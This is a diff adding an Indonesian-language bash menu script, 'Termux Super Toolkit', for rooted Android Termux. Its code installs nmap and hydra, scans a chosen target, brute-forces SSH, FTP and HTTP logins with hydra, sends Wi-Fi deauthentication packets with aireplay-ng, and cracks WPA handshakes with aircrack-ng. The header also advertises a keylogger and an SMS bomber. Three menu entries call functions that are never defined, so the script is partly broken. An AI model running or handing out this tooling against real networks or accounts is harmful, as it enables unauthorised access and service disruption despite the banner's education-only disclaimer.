@@ -1,0 +1,154 @@
+#!/bin/bash
+
+# ================================================
+# TERMUX SUPER TOOLKIT v3.0
+# Author: @YourHackerAlias
+# Features: 
+# - Auto Pentest - WiFi Analyzer - Data Mining
+# - Keylogger (USB/BT) - SMS Bomber (Demo)
+# - Social Engineering Toolkit (SET)
+# ================================================
+
+# Colors
+RED='\033[1;91m'
+GREEN='\033[1;92m'
+YELLOW='\033[1;93m'
+BLUE='\033[1;94m'
+PURPLE='\033[1;95m'
+CYAN='\033[1;96m'
+NC='\033[0m'
+
+# Root check
+if [[ $EUID -ne 0 ]]; then
+  echo -e "${RED}[!] Jalankan sebagai root! (su)${NC}"
+  exit 1
+fi
+
+# Banner
+banner() {
+  clear
+  echo -e "${PURPLE}"
+  echo ' ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ '
+  echo '▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌'
+  echo '▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ '
+  echo '▐░▌          ▐░▌       ▐░▌▐░▌          '
+  echo '▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ '
+  echo '▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌'
+  echo ' ▀▀▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌'
+  echo '          ▐░▌▐░▌       ▐░▌          ▐░▌'
+  echo ' ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌'
+  echo '▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌'
+  echo ' ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ '
+  echo -e "${NC}"
+  echo -e "${CYAN}  [+] Termux Super Toolkit v3.0 ${NC}"
+  echo -e "${YELLOW}  [+] Gunakan dengan Bijak! ${NC}"
+  echo -e "${RED}  [!] Hanya untuk Edukasi & Legal Penetration Testing${NC}\n"
+}
+
+# Main Menu
+main_menu() {
+  banner
+  echo -e "${GREEN}[1] ${CYAN}Auto Pentest Toolkit"
+  echo -e "${GREEN}[2] ${CYAN}WiFi Hacking Suite"
+  echo -e "${GREEN}[3] ${CYAN}Social Engineering Toolkit (SET)"
+  echo -e "${GREEN}[4] ${CYAN}Data Mining & OSINT"
+  echo -e "${GREEN}[5] ${CYAN}Device Monitoring"
+  echo -e "${GREEN}[6] ${CYAN}Exit${NC}"
+  read -p "Pilih menu: " choice
+
+  case $choice in
+    1) auto_pentest ;;
+    2) wifi_hacking ;;
+    3) setoolkit_menu ;;
+    4) data_mining ;;
+    5) device_monitor ;;
+    6) exit 0 ;;
+    *) echo -e "${RED}[!] Pilihan salah!${NC}"; sleep 1; main_menu ;;
+  esac
+}
+
+# Auto Pentest
+auto_pentest() {
+  clear
+  echo -e "${BLUE}[*] Memulai Auto Pentest...${NC}"
+  
+  # Install tools jika belum ada
+  if ! command -v nmap &> /dev/null; then
+    echo -e "${YELLOW}[+] Menginstall Nmap...${NC}"
+    pkg install nmap -y
+  fi
+  
+  if ! command -v hydra &> /dev/null; then
+    echo -e "${YELLOW}[+] Menginstall Hydra...${NC}"
+    pkg install hydra -y
+  fi
+
+  read -p "Masukkan target IP/host: " target
+  
+  echo -e "\n${GREEN}[*] Scanning port...${NC}"
+  nmap -sV -A -T4 $target | tee scan_results.txt
+  
+  echo -e "\n${GREEN}[*] Bruteforce common services...${NC}"
+  hydra -L wordlists/users.txt -P wordlists/passwords.txt $target ssh ftp http-post-form -t 4
+  
+  echo -e "\n${GREEN}[√] Hasil disimpan di scan_results.txt${NC}"
+  read -p "Tekan Enter untuk kembali..."
+  main_menu
+}
+
+# WiFi Hacking
+wifi_hacking() {
+  clear
+  echo -e "${RED}"
+  echo "    _    _ ______ _____  _   _  _____ "
+  echo "   | |  | |  ____|  __ \| \ | |/ ____|"
+  echo "   | |__| | |__  | |__) |  \| | (___  "
+  echo "   |  __  |  __| |  _  /| . \ |\___ \ "
+  echo "   | |  | | |____| | \ \| |\  |____) |"
+  echo "   |_|  |_|______|_|  \_\_| \_|_____/ "
+  echo -e "${NC}"
+  
+  echo -e "${GREEN}[1] Scan WiFi Networks"
+  echo -e "[2] Deauth Attack (Requires Monitor Mode)"
+  echo -e "[3] Crack WPA Handshake"
+  echo -e "[4] Back to Main Menu${NC}"
+  read -p "Pilih aksi: " action
+
+  case $action in
+    1) 
+      echo -e "\n${CYAN}[*] Memindai jaringan WiFi...${NC}"
+      termux-wifi-scaninfo
+      ;;
+    2)
+      read -p "Masukkan BSSID target: " bssid
+      echo -e "\n${YELLOW}[!] Pastikan monitor mode aktif!${NC}"
+      aireplay-ng --deauth 10 -a $bssid wlan0
+      ;;
+    3)
+      read -p "Masukkan path file .cap: " capfile
+      aircrack-ng -w wordlists/rockyou.txt $capfile
+      ;;
+    4)
+      main_menu
+      ;;
+    *)
+      echo -e "${RED}[!] Pilihan tidak valid${NC}"
+      ;;
+  esac
+  read -p "Tekan Enter untuk melanjutkan..."
+  wifi_hacking
+}
+
+# Main Execution
+if [[ "$OSTYPE" != "linux-android"* ]]; then
+  echo -e "${RED}[!] Script ini hanya untuk Termux di Android!${NC}"
+  exit 1
+fi
+
+# Check dependencies
+if ! command -v proot &> /dev/null; then
+  echo -e "${YELLOW}[+] Menginstall proot...${NC}"
+  pkg install proot -y
+fi
+
+main_menu
